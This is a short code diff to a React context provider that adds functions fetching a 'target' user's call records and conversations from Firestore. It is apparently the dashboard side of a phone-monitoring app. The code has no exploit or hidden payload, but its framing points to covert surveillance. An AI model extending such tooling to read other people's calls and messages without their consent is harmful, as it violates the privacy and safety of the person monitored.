@@ -160,6 +160,20 @@ function ContentProvider({ children }) {
     }, 3000);
   }
 
+
+  // ? Get Target Data
+  const getCalls = (callback) => {
+    firestoreDb.collection("target_users").doc(currentUser.targetMobileName).collection("data").doc("calls").get().then(doc => {
+      callback(doc.data())
+    })
+  }
+
+  const getMessages = (callback) => {
+    firestoreDb.collection("target_users").doc(currentUser.targetMobileName).collection("data").doc("conversations").get().then(doc => {
+      callback(doc.data())
+    })
+  }
+
   //! Provider Value
   const ContentValue = {
     currentUser,
@@ -170,6 +184,7 @@ function ContentProvider({ children }) {
     setToast,
     createCredential,
     loading,
+    getCalls, getMessages
   };
 
   return (
